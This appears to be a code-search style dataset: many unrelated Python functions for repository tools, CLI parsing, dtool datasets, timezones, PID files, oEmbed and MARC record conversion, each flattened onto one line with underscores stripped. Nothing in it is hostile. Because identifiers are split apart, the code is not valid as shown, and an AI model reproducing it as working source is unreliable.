return result and errors list return len ( errors ) == 0 , errors
def reset ( self ) : self . path = None self . repo = { 'repository unique name' : str ( uuid . uuid1 ( ) ) , 'create utctime' : time . time ( ) , 'last update utctime' : None , 'pyrep version' : str ( version ) , 'repository information' : '' , 'walk repo' : [ ] }
def print big dir ( self , top n = 5 ) : self . assert is dir and exists ( ) size table = sorted ( [ ( p , p . dirsize ) for p in self . select dir ( recursive = False ) ] , key = lambda x : x [ 1 ] , reverse = True , ) for p , size in size table [ : top n ] : print ( "{:<9}    {:<9}" . format ( repr data size ( size ) , p . abspath ) )
def print big file ( self , top n = 5 ) : self . assert is dir and exists ( ) size table = sorted ( [ ( p , p . size ) for p in self . select file ( recursive = True ) ] , key = lambda x : x [ 1 ] , reverse = True , ) for p , size in size table [ : top n ] : print ( "{:<9}    {:<9}" . format ( repr data size ( size ) , p . abspath ) )
def print big dir and big file ( self , top n = 5 ) : self . assert is dir and exists ( ) size table1 = sorted ( [ ( p , p . dirsize ) for p in self . select dir ( recursive = False ) ] , key = lambda x : x [ 1 ] , reverse = True , ) for p1 , size1 in size table1 [ : top n ] : print ( "{:<9}    {:<9}" . format ( repr data size ( size1 ) , p1 . abspath ) ) size table2 = sorted ( [ ( p , p . size ) for p in p1 . select file ( recursive = True ) ] , key = lambda x : x [ 1 ] , reverse = True , ) for p2 , size2 in size table2 [ : top n ] : print ( "    {:<9}    {:<9}" . format ( repr data size ( size2 ) , p2 . abspath ) )
def size ( self ) : try : return self . stat . st size except : # pragma: no cover self . stat = self . stat ( ) return self . size
def mtime ( self ) : try : return self . stat . st mtime except : # pragma: no cover self . stat = self . stat ( ) return self . mtime
def atime ( self ) : try : return self . stat . st atime except : # pragma: no cover self . stat = self . stat ( ) return self . atime
def ctime ( self ) : try : return self . stat . st ctime except : # pragma: no cover self . stat = self . stat ( ) return self . ctime
def keys ( self ) : return self . options . keys ( ) + [ p . name for p in self . positional args ]
def values ( self ) : return self . options . values ( ) + [ p . value for p in self . positional args ]
def items ( self ) : return [ ( p . name , p . value ) for p in self . options . values ( ) + self . positional args ]
def add option ( self , option ) : if option . name in self . options : raise Value Error ( 'name already in use' ) if option . abbreviation in self . abbreviations : raise Value Error ( 'abbreviation already in use' ) if option . name in [ arg . name for arg in self . positional args ] : raise Value Error ( 'name already in use by a positional argument' ) self . options [ option . name ] = option if option . abbreviation : self . abbreviations [ option . abbreviation ] = option self . option order . append ( option . name )
def optionhelp ( self , indent = 0 , maxindent = 25 , width = 79 ) : def makelabels ( option ) : labels = '%*s--%s' % ( indent , ' ' , option . name ) if option . abbreviation : labels += ', -' + option . abbreviation return labels + ': ' docs = [ ] helpindent = autoindent ( [ makelabels ( o ) for o in self . options . values ( ) ] , indent , maxindent ) for name in self . option order : option = self . options [ name ] labels = makelabels ( option ) helpstring = "%s(%s). %s" % ( option . formatname , option . strvalue , option . docs ) wrapped = self . wrap labelled ( labels , helpstring , helpindent , width ) docs . extend ( wrapped ) return '\n' . join ( docs )
def posarghelp ( self , indent = 0 , maxindent = 25 , width = 79 ) : docs = [ ] makelabel = lambda posarg : ' ' * indent + posarg . displayname + ': ' helpindent = autoindent ( [ makelabel ( p ) for p in self . positional args ] , indent , maxindent ) for posarg in self . positional args : label = makelabel ( posarg ) text = posarg . formatname + '. ' + posarg . docs wrapped = self . wrap labelled ( label , text , helpindent , width ) docs . extend ( wrapped ) return '\n' . join ( docs )
def parse ( self , file ) : if isinstance ( file , basestring ) : file = open ( file ) line number = 0 label = None block = self . untagged for line in file : line number += 1 line = line . rstrip ( '\n' ) if self . tabsize > 0 : line = line . replace ( '\t' , ' ' * self . tabsize ) if self . decommenter : line = self . decommenter . decomment ( line ) if line is None : continue tag = line . split ( ':' , 1 ) [ 0 ] . strip ( ) # Still in the same block? if tag not in self . names : if block is None : if line and not line . isspace ( ) : raise Parse Error ( file . name , line , "garbage before first block: %r" % line ) continue block . addline ( line ) continue # Open a new block. name = self . names [ tag ] label = line . split ( ':' , 1 ) [ 1 ] . strip ( ) if name in self . labelled classes : if not label : raise Parse Error ( file . name , line , "missing label for %r block" % name ) block = self . blocks [ name ] . setdefault ( label , self . labelled classes [ name ] ( ) ) else : if label : msg = "label %r present for unlabelled block %r" % ( label , name ) raise Parse Error ( file . name , line number , msg ) block = self . blocks [ name ] block . startblock ( )
def get separator ( self , i ) : return i and self . separator [ min ( i - 1 , len ( self . separator ) - 1 ) ] or ''
def authorize url ( self ) : auth url = OAUTH ROOT + '/authorize' params = { 'client id' : self . client id , 'redirect uri' : self . redirect uri , } return "{}?{}" . format ( auth url , urlencode ( params ) )
def exchange token ( self , code ) : access token url = OAUTH ROOT + '/access token' params = { 'client id' : self . client id , 'client secret' : self . client secret , 'redirect uri' : self . redirect uri , 'code' : code , } resp = requests . get ( access token url , params = params ) if not resp . ok : raise Mixcloud Oauth Error ( "Could not get access token." ) return resp . json ( ) [ 'access token' ]
def acquire ( self , * args , * * kwargs ) : with self . stat lock : self . waiting += 1 self . lock . acquire ( * args , * * kwargs ) with self . stat lock : self . locked = True self . waiting -= 1
def release ( self ) : self . lock . release ( ) with self . stat lock : self . locked = False self . last released = datetime . now ( )
def default decoder ( self , obj ) : typename , marshalled state = self . unwrap callback ( obj ) if typename is None : return obj try : cls , unmarshaller = self . serializer . unmarshallers [ typename ] except Key Error : raise Lookup Error ( 'no unmarshaller found for type "{}"' . format ( typename ) ) from None if cls is not None : instance = cls . new ( cls ) unmarshaller ( instance , marshalled state ) return instance else : return unmarshaller ( marshalled state )
def create ( quiet , name , base uri , symlink path ) : validate name ( name ) admin metadata = dtoolcore . generate admin metadata ( name ) parsed base uri = dtoolcore . utils . generous parse uri ( base uri ) if parsed base uri . scheme == "symlink" : if symlink path is None : raise click . Usage Error ( "Need to specify symlink path using the -s/--symlink-path option" ) # NOQA if symlink path : base uri = dtoolcore . utils . sanitise uri ( "symlink:" + parsed base uri . path ) parsed base uri = dtoolcore . utils . generous parse uri ( base uri ) # Create the dataset. proto dataset = dtoolcore . generate proto dataset ( admin metadata = admin metadata , base uri = dtoolcore . utils . urlunparse ( parsed base uri ) , config path = CONFIG PATH ) # If we are creating a symlink dataset we need to set the symlink path # attribute on the storage broker. if symlink path : symlink abspath = os . path . abspath ( symlink path ) proto dataset . storage broker . symlink path = symlink abspath try : proto dataset . create ( ) except dtoolcore . storagebroker . Storage Broker OS Error as err : raise click . Usage Error ( str ( err ) ) proto dataset . put readme ( "" ) if quiet : click . secho ( proto dataset . uri ) else : # Give the user some feedback and hints on what to do next. click . secho ( "Created proto dataset " , nl = False , fg = "green" ) click . secho ( proto dataset . uri ) click . secho ( "Next steps: " ) step = 1 if parsed base uri . scheme != "symlink" : click . secho ( "{}. Add raw data, eg:" . format ( step ) ) click . secho ( "   dtool add item my file.txt {}" . format ( proto dataset . uri ) , fg = "cyan" ) if parsed base uri . scheme == "file" : # Find the abspath of the data directory for user feedback. data path = proto dataset . storage broker . data abspath click . secho ( "   Or use your system commands, e.g: " ) click . secho ( "   mv my data directory {}/" . format ( data path ) , fg = "cyan" ) step = step + 1 click . secho ( "{}. Add descriptive metadata, e.g: " . format ( step ) ) click . secho ( "   dtool readme interactive {}" . format ( proto dataset . uri ) , fg = "cyan" ) step = step + 1 click . secho ( "{}. Convert the proto dataset into a dataset: " . format ( step ) ) click . secho ( "   dtool freeze {}" . format ( proto dataset . uri ) , fg = "cyan" )
def interactive ( proto dataset uri ) : proto dataset = dtoolcore . Proto Data Set . from uri ( uri = proto dataset uri , config path = CONFIG PATH ) # Create an Commented Map representation of the yaml readme template. readme template = get readme template ( ) yaml = YAML ( ) yaml . explicit start = True yaml . indent ( mapping = 2 , sequence = 4 , offset = 2 ) descriptive metadata = yaml . load ( readme template ) descriptive metadata = prompt for values ( descriptive metadata ) # Write out the descriptive metadata to the readme file. stream = String IO ( ) yaml . dump ( descriptive metadata , stream ) proto dataset . put readme ( stream . getvalue ( ) ) click . secho ( "Updated readme " , fg = "green" ) click . secho ( "To edit the readme using your default editor:" ) click . secho ( "dtool readme edit {}" . format ( proto dataset uri ) , fg = "cyan" )
def edit ( dataset uri ) : try : dataset = dtoolcore . Proto Data Set . from uri ( uri = dataset uri , config path = CONFIG PATH ) except dtoolcore . Dtool Core Type Error : dataset = dtoolcore . Data Set . from uri ( uri = dataset uri , config path = CONFIG PATH ) readme content = dataset . get readme content ( ) try : # Python2 compatibility. readme content = unicode ( readme content , "utf-8" ) except Name Error : pass edited content = click . edit ( readme content ) if edited content is not None : validate and put readme ( dataset , edited content ) click . secho ( "Updated readme " , nl = False , fg = "green" ) else : click . secho ( "Did not update readme " , nl = False , fg = "red" ) click . secho ( dataset uri )
def show ( dataset uri ) : try : dataset = dtoolcore . Proto Data Set . from uri ( uri = dataset uri , config path = CONFIG PATH ) except dtoolcore . Dtool Core Type Error : dataset = dtoolcore . Data Set . from uri ( uri = dataset uri , config path = CONFIG PATH ) readme content = dataset . get readme content ( ) click . secho ( readme content )
def item ( proto dataset uri , input file , relpath in dataset ) : proto dataset = dtoolcore . Proto Data Set . from uri ( proto dataset uri , config path = CONFIG PATH ) if relpath in dataset == "" : relpath in dataset = os . path . basename ( input file ) proto dataset . put item ( input file , relpath in dataset )
def metadata ( proto dataset uri , relpath in dataset , key , value ) : proto dataset = dtoolcore . Proto Data Set . from uri ( uri = proto dataset uri , config path = CONFIG PATH ) proto dataset . add item metadata ( handle = relpath in dataset , key = key , value = value )
def cp ( resume , quiet , dataset uri , dest base uri ) : copy ( resume , quiet , dataset uri , dest base uri )
def fromutc ( self , dt ) : if not isinstance ( dt , datetime ) : raise Type Error ( "fromutc() requires a datetime argument" ) if dt . tzinfo is not self : raise Value Error ( "dt.tzinfo is not self" ) # Get transitions - if there are none, fixed offset transitions = self . transitions ( dt . year ) if transitions is None : return dt + self . utcoffset ( dt ) # Get the transition times in UTC dston , dstoff = transitions dston -= self . std offset dstoff -= self . std offset utc transitions = ( dston , dstoff ) dt utc = dt . replace ( tzinfo = None ) isdst = self . naive isdst ( dt utc , utc transitions ) if isdst : dt wall = dt + self . dst offset else : dt wall = dt + self . std offset fold = int ( not isdst and self . is ambiguous ( dt wall ) ) return enfold ( dt wall , fold = fold )
def strip comment line with symbol ( line , start ) : parts = line . split ( start ) counts = [ len ( findall ( r'(?:^|[^"\\]|(?:\\\\|\\")+)(")' , part ) ) for part in parts ] total = 0 for nr , count in enumerate ( counts ) : total += count if total % 2 == 0 : return start . join ( parts [ : nr + 1 ] ) . rstrip ( ) else : # pragma: no cover return line . rstrip ( )
def picknthweekday ( year , month , dayofweek , hour , minute , whichweek ) : first = datetime . datetime ( year , month , 1 , hour , minute ) # This will work if dayofweek is ISO weekday (1-7) or Microsoft-style (0-6), # Because 7 % 7 = 0 weekdayone = first . replace ( day = ( ( dayofweek - first . isoweekday ( ) ) % 7 ) + 1 ) wd = weekdayone + ( ( whichweek - 1 ) * ONEWEEK ) if ( wd . month != month ) : wd -= ONEWEEK return wd
def valuestodict ( key ) : dout = { } size = winreg . Query Info Key ( key ) [ 1 ] tz res = None for i in range ( size ) : key name , value , dtype = winreg . Enum Value ( key , i ) if dtype == winreg . REG DWORD or dtype == winreg . REG DWORD LITTLE ENDIAN : # If it's a DWORD (32-bit integer), it's stored as unsigned - convert # that to a proper signed integer if value & ( 1 << 31 ) : value = value - ( 1 << 32 ) elif dtype == winreg . REG SZ : # If it's a reference to the tzres DLL, load the actual string if value . startswith ( '@tzres' ) : tz res = tz res or tzres ( ) value = tz res . name from string ( value ) value = value . rstrip ( '\x00' ) # Remove trailing nulls dout [ key name ] = value return dout
def set tzdata ( self , tzobj ) : # Copy the relevant attributes over as private attributes for attr in tzfile . attrs : setattr ( self , ' ' + attr , getattr ( tzobj , attr ) )
def get ( self , request , hash , filename ) : if ws download is True : return Http Response Forbidden ( ) upload = Upload . objects . uploaded ( ) . get ( hash = hash , name = filename ) return File Response ( upload . file , content type = upload . type )
def camelize classname ( base , tablename , table ) : "'words and underscores' -> 'Words And Underscores'" return str ( tablename [ 0 ] . upper ( ) + re . sub ( r' ([a-z])' , lambda m : m . group ( 1 ) . upper ( ) , tablename [ 1 : ] ) )
def pluralize collection ( base , local cls , referred cls , constraint ) : "'Some Term' -> 'some terms'" referred name = referred cls . name uncamelized = re . sub ( r'[A-Z]' , lambda m : " %s" % m . group ( 0 ) . lower ( ) , referred name ) [ 1 : ] pluralized = pluralizer . plural ( uncamelized ) return pluralized
def dump deque ( self , obj , class name = "collections.deque" ) : return { "$" + class name : [ self . json convert ( item ) for item in obj ] }
def dump Ordered Dict ( self , obj , class name = "collections.Ordered Dict" ) : return { "$" + class name : [ ( key , self . json convert ( value ) ) for key , value in iteritems ( obj ) ] }
def dump nparray ( self , obj , class name = numpy ndarray class name ) : return { "$" + class name : self . json convert ( obj . tolist ( ) ) }
def join ( prev , sep , * args , * * kw ) : yield sep . join ( prev , * args , * * kw )
def substitute ( prev , * args , * * kw ) : template obj = string . Template ( * args , * * kw ) for data in prev : yield template obj . substitute ( data )
def safe substitute ( prev , * args , * * kw ) : template obj = string . Template ( * args , * * kw ) for data in prev : yield template obj . safe substitute ( data )
def to str ( prev , encoding = None ) : first = next ( prev ) if isinstance ( first , str ) : if encoding is None : yield first for s in prev : yield s else : yield first . encode ( encoding ) for s in prev : yield s . encode ( encoding ) else : if encoding is None : encoding = sys . stdout . encoding or 'utf-8' yield first . decode ( encoding ) for s in prev : yield s . decode ( encoding )
def register default types ( ) : register type ( type , pipe . map ) register type ( types . Function Type , pipe . map ) register type ( types . Method Type , pipe . map ) register type ( tuple , seq ) register type ( list , seq ) register type ( types . Generator Type , seq ) register type ( string type , sh ) register type ( unicode type , sh ) register type ( file type , fileobj ) if is py3 : register type ( range , seq ) register type ( map , seq )
def check pidfile ( pidfile , debug ) : # Check PID exists and see if the PID is running if os . path . isfile ( pidfile ) : pidfile handle = open ( pidfile , 'r' ) # try and read the PID file. If no luck, remove it try : pid = int ( pidfile handle . read ( ) ) pidfile handle . close ( ) if check pid ( pid , debug ) : return True except : pass # PID is not active, remove the PID file os . unlink ( pidfile ) # Create a PID file, to ensure this is script is only run once (at a time) pid = str ( os . getpid ( ) ) open ( pidfile , 'w' ) . write ( pid ) return False
def check pid ( pid , debug ) : try : # A Kill of 0 is to check if the PID is active. It won't kill the process os . kill ( pid , 0 ) if debug > 1 : print ( "Script has a PIDFILE where the process is still running" ) return True except OS Error : if debug > 1 : print ( "Script does not appear to be running" ) return False
def convert words to uint ( high word , low word ) : try : low num = int ( low word ) # low word might arrive as a signed number. Convert to unsigned if low num < 0 : low num = abs ( low num ) + 2 ** 15 number = ( int ( high word ) << 16 ) | low num return number , True except : return 0 , False
def convert words to float ( high word , low word ) : number , retval = convert words to uint ( high word , low word ) if not retval : return 0.0 , False try : packed float = struct . pack ( '>l' , number ) return struct . unpack ( '>f' , packed float ) [ 0 ] , True except : return 0.0 , False
def disown ( debug ) : # Get the current PID pid = os . getpid ( ) cgroup file = "/proc/" + str ( pid ) + "/cgroup" try : infile = open ( cgroup file , "r" ) except IO Error : print ( "Could not open cgroup file: " , cgroup file ) return False # Read each line for line in infile : # Check if the line contains "ardexa.service" if line . find ( "ardexa.service" ) == - 1 : continue # if the lines contains "name=", replace it with nothing line = line . replace ( "name=" , "" ) # Split  the line by commas items list = line . split ( ':' ) accounts = items list [ 1 ] dir str = accounts + "/ardexa.disown" # If accounts is empty, continue if not accounts : continue # Create the dir and all subdirs full dir = "/sys/fs/cgroup/" + dir str if not os . path . exists ( full dir ) : os . makedirs ( full dir ) if debug >= 1 : print ( "Making directory: " , full dir ) else : if debug >= 1 : print ( "Directory already exists: " , full dir ) # Add the PID to the file full path = full dir + "/cgroup.procs" prog list = [ "echo" , str ( pid ) , ">" , full path ] run program ( prog list , debug , True ) # If this item contains a comma, then separate it, and reverse # some O Ses will need cpuacct,cpu reversed to actually work if accounts . find ( "," ) != - 1 : acct list = accounts . split ( ',' ) accounts = acct list [ 1 ] + "," + acct list [ 0 ] dir str = accounts + "/ardexa.disown" # Create the dir and all subdirs. But it may not work. So use a TRY full dir = "/sys/fs/cgroup/" + dir str try : if not os . path . exists ( full dir ) : os . makedirs ( full dir ) except : continue # Add the PID to the file full path = full dir + "/cgroup.procs" prog list = [ "echo" , str ( pid ) , ">" , full path ] run program ( prog list , debug , True ) infile . close ( ) # For debug purposes only if debug >= 1 : prog list = [ "cat" , cgroup file ] run program ( prog list , debug , False ) # If there are any "ardexa.service" in the proc file. If so, exit with error prog list = [ "grep" , "-q" , "ardexa.service" , cgroup file ] if run program ( prog list , debug , False ) : # There are entries still left in the file return False return True
def encode ids ( * args ) : ids = [ ] for v in args : if isinstance ( v , basestring ) : qv = v . encode ( 'utf-8' ) if isinstance ( v , unicode ) else v ids . append ( urllib . quote ( qv ) ) else : qv = str ( v ) ids . append ( urllib . quote ( qv ) ) return ';' . join ( ids )
def flush ( self , line ) : # TODO -- maybe use echo? sys . stdout . write ( line ) sys . stdout . flush ( )
def find meta ( * meta file parts , meta key ) : meta file = read ( * meta file parts ) meta match = re . search ( r"^ {}  = ['\"]([^'\"]*)['\"]" . format ( meta key ) , meta file , re . M ) if meta match : return meta match . group ( 1 ) raise Runtime Error ( "Unable to find  {}  string." . format ( meta key ) )
def main ( path ) : basepath = os . path . abspath ( os . path . expanduser ( str ( path ) ) ) echo . h2 ( "Available scripts in {}" . format ( basepath ) ) echo . br ( ) for root dir , dirs , files in os . walk ( basepath , topdown = True ) : for f in fnmatch . filter ( files , '*.py' ) : try : filepath = os . path . join ( root dir , f ) # super edge case, this makes sure the python script won't start # an interactive console session which would cause the session # to start and not allow the for loop to complete with open ( filepath , encoding = "UTF-8" ) as fp : body = fp . read ( ) is console = "Interactive Console" in body is console = is console or "code" in body is console = is console and "interact(" in body if is console : continue s = captain . Script ( filepath ) if s . can run from cli ( ) : rel filepath = s . call path ( basepath ) p = s . parser echo . h3 ( rel filepath ) desc = p . description if desc : echo . indent ( desc , indent = ( " " * 4 ) ) subcommands = s . subcommands if subcommands : echo . br ( ) echo . indent ( "Subcommands:" , indent = ( " " * 4 ) ) for sc in subcommands . keys ( ) : echo . indent ( sc , indent = ( " " * 6 ) ) echo . br ( ) except captain . Parse Error : pass except Exception as e : #echo.exception(e) #echo.err("Failed to parse {} because {}", f, e.message) echo . err ( "Failed to parse {}" , f ) echo . verbose ( e . message ) echo . br ( )
def make request data ( self , zipcode , city , state ) : data = { 'key' : self . api key , 'postalcode' : str ( zipcode ) , 'city' : city , 'state' : state } data = Zip Tax Client . clean request data ( data ) return data
def process response ( self , resp , multiple rates ) : self . check for exceptions ( resp , multiple rates ) rates = { } for result in resp [ 'results' ] : rate = Zip Tax Client . cast tax rate ( result [ 'tax Sales' ] ) rates [ result [ 'geo City' ] ] = rate if not multiple rates : return rates [ list ( rates . keys ( ) ) [ 0 ] ] return rates
def check for exceptions ( self , resp , multiple rates ) : if resp [ 'r Code' ] != 100 : raise exceptions . get exception for code ( resp [ 'r Code' ] ) ( resp ) results = resp [ 'results' ] if len ( results ) == 0 : raise exceptions . Zip Tax No Results ( 'No results found' ) if len ( results ) > 1 and not multiple rates : # It's fine if all the taxes are the same rates = [ result [ 'tax Sales' ] for result in results ] if len ( set ( rates ) ) != 1 : raise exceptions . Zip Tax Multiple Results ( 'Multiple results found but requested only one' )
def get all text ( node ) : if node . node Type == node . TEXT NODE : return node . data else : text string = "" for child node in node . child Nodes : text string += get all text ( child node ) return text string
def extract packages ( self ) : self . path unpacked = mkdtemp ( prefix = "scoap3 package " , dir = CFG TMPSHAREDDIR ) for path in self . retrieved packages unpacked : scoap3utils extract package ( path , self . path unpacked , self . logger ) return self . path unpacked
def register ( self , provider class ) : if not issubclass ( provider class , Base Provider ) : raise Type Error ( '%s is not a subclass of Base Provider' % provider class . name ) if provider class in self . registered providers : raise Already Registered ( '%s is already registered' % provider class . name ) if issubclass ( provider class , Django Provider ) : # set up signal handler for cache invalidation signals . post save . connect ( self . invalidate stored oembeds , sender = provider class . meta . model ) # don't build the regex yet - if not all urlconfs have been loaded # and processed at this point, the Django Provider instances will fail # when attempting to reverse urlpatterns that haven't been created. # Rather, the regex-list will be populated once, on-demand. self . registered providers . append ( provider class ) # flag for re-population self . invalidate providers ( )
def unregister ( self , provider class ) : if not issubclass ( provider class , Base Provider ) : raise Type Error ( '%s must be a subclass of Base Provider' % provider class . name ) if provider class not in self . registered providers : raise Not Registered ( '%s is not registered' % provider class . name ) self . registered providers . remove ( provider class ) # flag for repopulation self . invalidate providers ( )
def provider for url ( self , url ) : for provider , regex in self . get registry ( ) . items ( ) : if re . match ( regex , url ) is not None : return provider raise O Embed Missing Endpoint ( 'No endpoint matches URL: %s' % url )
def invalidate stored oembeds ( self , sender , instance , created , * * kwargs ) : ctype = Content Type . objects . get for model ( instance ) Stored O Embed . objects . filter ( object id = instance . pk , content type = ctype ) . delete ( )
def embed ( self , url , * * kwargs ) : try : # first figure out the provider provider = self . provider for url ( url ) except O Embed Missing Endpoint : raise else : try : # check the database for a cached response, because of certain # race conditions that exist with get or create(), do a filter # lookup and just grab the first item stored match = Stored O Embed . objects . filter ( match = url , maxwidth = kwargs . get ( 'maxwidth' , None ) , maxheight = kwargs . get ( 'maxheight' , None ) , date expires gte = datetime . datetime . now ( ) ) [ 0 ] return O Embed Resource . create json ( stored match . response json ) except Index Error : # query the endpoint and cache response in db # prevent None from being passed in as a GET param params = dict ( [ ( k , v ) for k , v in kwargs . items ( ) if v ] ) # request an oembed resource for the url resource = provider . request resource ( url , * * params ) try : cache age = int ( resource . cache age ) if cache age < MIN OEMBED TTL : cache age = MIN OEMBED TTL except : cache age = DEFAULT OEMBED TTL date expires = datetime . datetime . now ( ) + datetime . timedelta ( seconds = cache age ) stored oembed , created = Stored O Embed . objects . get or create ( match = url , maxwidth = kwargs . get ( 'maxwidth' , None ) , maxheight = kwargs . get ( 'maxheight' , None ) ) stored oembed . response json = resource . json stored oembed . resource type = resource . type stored oembed . date expires = date expires if resource . content object : stored oembed . content object = resource . content object stored oembed . save ( ) return resource
def autodiscover ( self , url ) : headers , response = fetch url ( url ) if headers [ 'content-type' ] . split ( ';' ) [ 0 ] in ( 'application/json' , 'text/javascript' ) : provider data = json . loads ( response ) return self . store providers ( provider data )
def store providers ( self , provider data ) : if not hasattr ( provider data , ' iter ' ) : raise O Embed Exception ( 'Autodiscovered response not iterable' ) provider pks = [ ] for provider in provider data : if 'endpoint' not in provider or 'matches' not in provider : continue resource type = provider . get ( 'type' ) if resource type not in RESOURCE TYPES : continue stored provider , created = Stored Provider . objects . get or create ( wildcard regex = provider [ 'matches' ] ) if created : stored provider . endpoint url = relative to full ( provider [ 'endpoint' ] , provider [ 'matches' ] ) stored provider . resource type = resource type stored provider . save ( ) provider pks . append ( stored provider . pk ) return Stored Provider . objects . filter ( pk in = provider pks )
def image field ( self ) : for field in self . model . meta . fields : if isinstance ( field , Image Field ) : return field . name
def date field ( self ) : for field in self . model . meta . fields : if isinstance ( field , ( Date Time Field , Date Field ) ) : return field . name
def get image ( self , obj ) : if self . meta . image field : return getattr ( obj , self . meta . image field )
def map to dictionary ( self , url , obj , * * kwargs ) : maxwidth = kwargs . get ( 'maxwidth' , None ) maxheight = kwargs . get ( 'maxheight' , None ) provider url , provider name = self . provider from url ( url ) mapping = { 'version' : '1.0' , 'url' : url , 'provider name' : provider name , 'provider url' : provider url , 'type' : self . resource type } # a hook self . preprocess ( obj , mapping , * * kwargs ) # resize image if we have a photo, otherwise use the given maximums if self . resource type == 'photo' and self . get image ( obj ) : self . resize photo ( obj , mapping , maxwidth , maxheight ) elif self . resource type in ( 'video' , 'rich' , 'photo' ) : width , height = size to nearest ( maxwidth , maxheight , self . meta . valid sizes , self . meta . force fit ) mapping . update ( width = width , height = height ) # create a thumbnail if self . get image ( obj ) : self . thumbnail ( obj , mapping ) # map attributes to the mapping dictionary.  if the attribute is # a callable, it must have an argument signature of # (self, obj) for attr in ( 'title' , 'author name' , 'author url' , 'html' ) : self . map attr ( mapping , attr , obj ) # fix any urls if 'url' in mapping : mapping [ 'url' ] = relative to full ( mapping [ 'url' ] , url ) if 'thumbnail url' in mapping : mapping [ 'thumbnail url' ] = relative to full ( mapping [ 'thumbnail url' ] , url ) if 'html' not in mapping and mapping [ 'type' ] in ( 'video' , 'rich' ) : mapping [ 'html' ] = self . render html ( obj , context = Context ( mapping ) ) # a hook self . postprocess ( obj , mapping , * * kwargs ) return mapping
def get record ( self ) : self . recid = self . get recid ( ) self . remove controlfields ( ) self . update system numbers ( ) self . add systemnumber ( "Inspire" , recid = self . recid ) self . add control number ( "003" , "Sz Ge CERN" ) self . update collections ( ) self . update languages ( ) self . update reportnumbers ( ) self . update authors ( ) self . update journals ( ) self . update subject categories ( "INSPIRE" , "Sz Ge CERN" , "categories cds" ) self . update pagenumber ( ) self . update notes ( ) self . update experiments ( ) self . update isbn ( ) self . update dois ( ) self . update links and ffts ( ) self . update date ( ) self . update date year ( ) self . update hidden notes ( ) self . update oai info ( ) self . update cnum ( ) self . update conference info ( ) self . fields list = [ "909" , "541" , "961" , "970" , "690" , "695" , "981" , ] self . strip fields ( ) if "ANNOUNCEMENT" in self . collections : self . update conference 111 ( ) self . update conference links ( ) record add field ( self . record , "690" , ind1 = "C" , subfields = [ ( "a" , "CONFERENCE" ) ] ) if "THESIS" in self . collections : self . update thesis information ( ) self . update thesis supervisors ( ) if "PROCEEDINGS" in self . collections : # Special proceeding syntax self . update title to proceeding ( ) self . update author to proceeding ( ) record add field ( self . record , "690" , ind1 = "C" , subfields = [ ( "a" , "CONFERENCE" ) ] ) # 690 tags if self . tag as cern : record add field ( self . record , "690" , ind1 = "C" , subfields = [ ( "a" , "CERN" ) ] ) return self . record
def update oai info ( self ) : for field in record get field instances ( self . record , '909' , ind1 = "C" , ind2 = "O" ) : new subs = [ ] for tag , value in field [ 0 ] : if tag == "o" : new subs . append ( ( "a" , value ) ) else : new subs . append ( ( tag , value ) ) if value in [ "CERN" , "CDS" , "For CDS" ] : self . tag as cern = True record add field ( self . record , '024' , ind1 = "8" , subfields = new subs ) record delete fields ( self . record , '909' )
def update cnum ( self ) : if "Conference Paper" not in self . collections : cnums = record get field values ( self . record , '773' , code = "w" ) for cnum in cnums : cnum subs = [ ( "9" , "INSPIRE-CNUM" ) , ( "a" , cnum ) ] record add field ( self . record , "035" , subfields = cnum subs )
def update hidden notes ( self ) : if not self . tag as cern : notes = record get field instances ( self . record , tag = "595" ) for field in notes : for dummy , value in field [ 0 ] : if value == "CDS" : self . tag as cern = True record delete fields ( self . record , tag = "595" )
def update collections ( self ) : for value in record get field values ( self . record , '980' , code = 'a' ) : if 'NOTE' in value . upper ( ) : self . collections . add ( 'NOTE' ) if 'THESIS' in value . upper ( ) : self . collections . add ( 'THESIS' ) if 'PUBLISHED' in value . upper ( ) : self . collections . add ( 'ARTICLE' ) if 'CONFERENCES' in value . upper ( ) : self . collections . add ( 'ANNOUNCEMENT' ) if 'PROCEEDINGS' in value . upper ( ) : self . collections . add ( 'PROCEEDINGS' ) elif 'CONFERENCEPAPER' in value . upper ( ) and "Conference Paper" not in self . collections : self . collections . add ( 'Conference Paper' ) if self . is published ( ) and "ARTICLE" not in self . collections : self . collections . add ( 'ARTICLE' ) else : self . collections . add ( 'PREPRINT' ) if "HIDDEN" in value . upper ( ) : self . hidden = True # Clear out any existing ones. record delete fields ( self . record , "980" ) if not self . collections : self . collections . add ( 'PREPRINT' ) for collection in self . collections : record add field ( self . record , tag = '980' , subfields = [ ( 'a' , collection ) ] ) if collection in self . collection base : subs = [ ( 'a' , self . collection base [ collection ] ) ] record add field ( self . record , tag = '960' , subfields = subs )
def update notes ( self ) : fields = record get field instances ( self . record , '500' ) for field in fields : subs = field get subfields ( field ) for sub in subs . get ( 'a' , [ ] ) : sub = sub . strip ( ) # remove any spaces before/after if sub . startswith ( "*" ) and sub . endswith ( "*" ) : record delete field ( self . record , tag = "500" , field position global = field [ 4 ] )
def update title to proceeding ( self ) : titles = record get field instances ( self . record , tag = "245" ) for title in titles : subs = field get subfields ( title ) new subs = [ ] if "a" in subs : new subs . append ( ( "a" , subs [ 'a' ] [ 0 ] ) ) if "b" in subs : new subs . append ( ( "c" , subs [ 'b' ] [ 0 ] ) ) record add field ( self . record , tag = "111" , subfields = new subs ) record delete fields ( self . record , tag = "245" ) record delete fields ( self . record , tag = "246" )
def update authors ( self ) : author names = record get field instances ( self . record , '100' ) author names . extend ( record get field instances ( self . record , '700' ) ) for field in author names : subs = field get subfields ( field ) for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == 'a' : field [ 0 ] [ idx ] = ( 'a' , value . replace ( "." , " " ) . strip ( ) ) elif key == 'v' : del field [ 0 ] [ idx ] if subs . get ( "u" , None ) == "CERN" : self . tag as cern = True
def update isbn ( self ) : isbns = record get field instances ( self . record , '020' ) for field in isbns : for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == 'a' : field [ 0 ] [ idx ] = ( 'a' , value . replace ( "-" , "" ) . strip ( ) )
def update dois ( self ) : dois = record get field instances ( self . record , '024' , ind1 = "7" ) all dois = { } for field in dois : subs = field get subfield instances ( field ) subs dict = dict ( subs ) if subs dict . get ( 'a' ) : if subs dict [ 'a' ] in all dois : record delete field ( self . record , tag = '024' , ind1 = '7' , field position global = field [ 4 ] ) continue all dois [ subs dict [ 'a' ] ] = field
